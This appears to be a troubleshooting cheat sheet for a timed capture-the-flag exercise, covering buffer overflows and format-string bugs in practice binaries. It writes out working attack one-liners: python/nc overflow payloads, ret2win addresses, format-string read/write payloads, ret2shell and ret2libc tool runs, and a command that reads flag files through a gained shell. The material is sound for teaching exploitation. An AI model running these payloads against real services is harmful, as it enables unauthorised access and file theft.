# STUCK — what to do when the script does not solve it

Every command on this page was run against the practice programs and works as written.
Replace `HOST`, `PORT`, `./chall` and the numbers with yours.

**The rule:** a stuck question gets **five minutes** of this page, then you move on and come
back at the end. One unsolved question costs less than twenty minutes spent on it.

Jump to: [A. the tool itself is broken](#a-the-tool-itself-is-broken) ·
[B. it ran, no flag](#b-it-ran-but-no-flag) ·
[C. which bug is it?](#c-which-bug-is-it-three-tests-by-hand) ·
[D. do it by hand](#d-do-it-by-hand) ·
[E. something in front of the bug](#e-something-comes-before-the-bug) ·
[F. the flag is on screen but not recognised](#f-the-flag-is-there-but-not-recognised) ·
[G. symptoms](#g-symptom--likely-cause)

---

## A. The tool itself is broken

| You see | Do this |
|---|---|
| `python3: can't open file 'go.py'` | you are in the wrong folder: `cd` into the `bof-scripts` folder first |
| `Traceback (most recent call last)` | run the solver directly: `python3 solve.py HOST PORT --binary ./chall --run`. If that also crashes, go to section D and use the single tools |
| it hangs with no output for a minute | `Ctrl-C` (the summary is kept), then check the connection: `nc HOST PORT` |
| `Connection refused` / `timed out` | wrong host or port, or the service is down. Test with `nc HOST PORT`. Tell the invigilator if `nc` fails too |
| `objdump: command not found` | you can still solve without the binary: run `go.py` with only host, port and notes |
| `Permission denied` running `./chall` | `chmod +x ./chall` (you never need to run it; the tools only read it) |
| everything is strange after you edited a file | get a clean copy back: `git checkout -- .` (or clone the repository again) |

Health check, 30 seconds: `bash smoke.sh` → `TOOLKIT OK`.

## B. It ran, but no flag

1. **Read `READ THIS FIRST`** at the bottom. It says what was established and what is missing.
2. **Run `go.py` again and type in more** from the paper: a size, an address, a password,
   a sentence. Check the "from your notes I read" block is right.
3. **Run it a second time unchanged** if it tried shellcode or ret2libc. Those use addresses
   that change on every connection.
4. **Look without attacking:**
   ```
   python3 solve.py HOST PORT --binary ./chall            # what it thinks this is; changes nothing
   python3 auto_pwn.py --host HOST --port PORT --recon --probe
   python3 elftool.py ./chall                             # ends with a plain verdict
   ```
5. Still nothing → section C, then D.

## C. Which bug is it? Three tests by hand

Connect with `nc HOST PORT` and try these, one connection each.

| Type this | If you see | It is |
|---|---|---|
| `%p.%p.%p.%p` | hex numbers like `0x7ffe…` come back | a **format string** → D3 |
| 300 letters `A` | the connection dies, or the normal last line is missing | an **overflow** → D1 or D2 |
| 300 letters `A` | a polite message ("too long") | a length check, not a bug; look at the other prompts |
| a normal word | "wrong code", "access denied", a value being compared | an overflow into a **variable** → D1 |

300 A's without counting: `python3 -c "print('A'*300)" | nc HOST PORT`

If you have the source, search it for `gets(`, `read(`, `scanf("%s"`, `strcpy(` (overflow) and
`printf(` with a single variable inside the brackets (format string).

## D. Do it by hand

Two facts you need for the `python3 -c` lines:

- addresses are written **backwards** (little-endian); `struct.pack` does that for you;
- `'<I'` is a 32-bit value, `'<Q'` is a 64-bit one.

### D1. Overflow into a variable

**Need:** how many filler bytes (the buffer's size), and the value the program checks.

- From source: `char name[32]; … if (code == 0x1337c0de)` → 32 and `0x1337c0de`.
- From a binary: `python3 elftool.py ./chall`.

```
python3 auto_pwn.py --host HOST --port PORT --goal var --offset 32 --value 0x1337c0de
```

Pure Python and `nc`:

```
(python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*32 + struct.pack('<I', 0x1337c0de) + b'\n')"; sleep 1) | nc -q 2 HOST PORT
```

The value is random each run and never shown? Send one letter many times, which makes both
sides of the comparison equal: `python3 -c "print('B'*64)" | nc HOST PORT`

### D2. Overflow into the return address (ret2win)

**Need:** the offset (filler before the return address) and the address of the function
that prints the flag.

| To find | Command |
|---|---|
| the function's address | `nm ./chall \| grep -i ' t '` — look for `win`, `flag`, `shell`, `secret` |
| the offset, with a binary | `python3 elftool.py ./chall` → "RET offset candidates" |
| the offset, no binary | `python3 auto_pwn.py --host HOST --port PORT --goal ret2win --crash-oracle` → "first damage at N" (the offset is N−1 or a little more) |
| both, sometimes | the service's own banner (`buffer:`, `saved RIP:`, `win():`) — the offset is saved RIP minus buffer |

```
python3 auto_pwn.py --host HOST --port PORT --goal ret2win --offset 40 --addr 0x401186 --arch amd64
```

Use `--arch i386` for a 32-bit program. Not sure of the offset? Give a range:
`--offset-start 36 --offset-end 80 --step 4`.

Pure Python and `nc`, 64-bit then 32-bit:

```
(python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*40 + struct.pack('<Q', 0x401186) + b'\n')"; sleep 1) | nc -q 2 HOST PORT
(python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*60 + struct.pack('<I', 0x8049225) + b'\n')"; sleep 1) | nc -q 2 HOST PORT
```

- **64-bit and it crashes instead of printing the flag:** add 1 to the address
  (`0x401186` → `0x401187`). That fixes stack alignment.
- **The function opens a shell instead of printing the flag:** keep the connection open and
  type a command:
  ```
  (python3 -c "…same as above…"; sleep 1; echo 'cat flag.txt flag* /home/*/flag*'; sleep 1) | nc -q 2 HOST PORT
  ```

**No flag-printing function, but the stack is executable** (`elftool.py` says NX off):

```
python3 ret2shell.py --binary ./chall --host HOST --port PORT --offset 140
python3 ret2shell.py --binary ./chall --host HOST --port PORT --offset 140 --interactive   # gives you the shell
```

**Worked on your copy but not on the server:**
`python3 verify.py --binary ./chall --host HOST --port PORT` prints a shift; add it:
`--shift=-0x10`.

**NX on and no flag-printing function:**
`python3 ret2libc.py HOST PORT --binary ./chall` (run it twice before giving up).

### D3. Format string

1. **Look at the stack.** The flag is often simply there.
   ```
   python3 fmtpwn.py HOST PORT --goal dump
   ```
   By hand: type `%p.%p.%p.%p.%p.%p.%p.%p` (32-bit) or `%lx.%lx.%lx.%lx.%lx.%lx` (64-bit).
2. **Hex that looks like text backwards** (`6d7230667b544953`)? Decode it:
   ```
   python3 flags.py
   ```
   paste the line, press Enter, then `Ctrl-D`.
3. **Read a string at an address** (the paper or `nm` gives the address):
   ```
   python3 fmtpwn.py HOST PORT --goal read --addr 0x0804c060
   ```
4. **Write a value to an address:**
   ```
   python3 fmtpwn.py HOST PORT --goal write --addr 0x40406c --value 0xDEADBEEF
   ```
   To find the address of a variable: `nm ./chall | grep -i target`.

If the tool says your input is **not on the stack**, or the binary is **PIE with one printf**,
only step 1 can work. If the question needs a write, move on.

## E. Something comes before the bug

A name prompt, a menu or a login before the vulnerable input.

- **Easiest:** put it in your notes — `password: hunter2` — and let `go.py` walk it.
- **By hand, overflow tools:** `--talk 'PROMPT=ANSWER'` for each harmless prompt, then
  `--talk 'PROMPT=PAYLOAD'` for the vulnerable one:
  ```
  python3 auto_pwn.py --host HOST --port PORT --goal ret2win --offset 72 --addr 0x401196 --arch amd64 --talk 'Name:=bob' --talk 'Message:=PAYLOAD'
  ```
- **By hand, the other tools:** `--pre ANSWER` for each harmless prompt:
  ```
  python3 ret2shell.py --binary ./chall --host HOST --port PORT --offset 164 --pre bob
  python3 fmtpwn.py HOST PORT --pre bob --goal dump
  ```
- **A login with an unknown password:** `strings ./chall` and look near the word "password";
  type `%p.%p.%p` as the username (hex back means the login itself leaks); try a very long
  username (a crash means the login itself overflows). Otherwise the password comes from
  another question.

## F. The flag is there but not recognised

- The tool prints the service's last reply under *"last response (the flag may be here but
  unrecognised)"*. Read it.
- A message about **flag-shaped text for a harmless input** means the service showed it
  without being attacked. The candidate is printed on its own line; if the question is just
  "connect and type something", that is your answer.
- Tell it the pattern:
  ```
  python3 solve.py HOST PORT --binary ./chall --run --flag-regex 'CTF\{[^}]*\}'
  ```
- Everything sent and received is in `solve_transcript.log`: `grep -a -i flag solve_transcript.log | tail`

## G. Symptom → likely cause

| Symptom | Likely cause | Try |
|---|---|---|
| right offset and address, 64-bit, still crashes | stack alignment | address + 1 |
| works locally, not on the server | different build | `verify.py`, then `--shift` |
| the payload seems cut short | the address or value contains a newline, space or zero byte the input function stops at | another address inside the same function (`objdump -d ./chall`), or address + 1 |
| "stack smashing detected" | a canary | it must be leaked first (a format string in the same program) or the question is not a plain overflow |
| addresses differ every run (`0x55…`, `0x56…`) | PIE | needs a leak from the service; look for an address in the banner |
| the tool says it solved but shows several flags | a shell listed many files | pick the one for this question |
| fine twice, fails the third time | random addresses | run it again |
| nothing at all comes back | the service wants a specific first input | connect with `nc` and read what it asks |

## Last resort

Write down, for the question: which bug (section C), the numbers you found, and what you
tried. If time remains at the end, a second look with a clear head is worth more than
pushing on now.
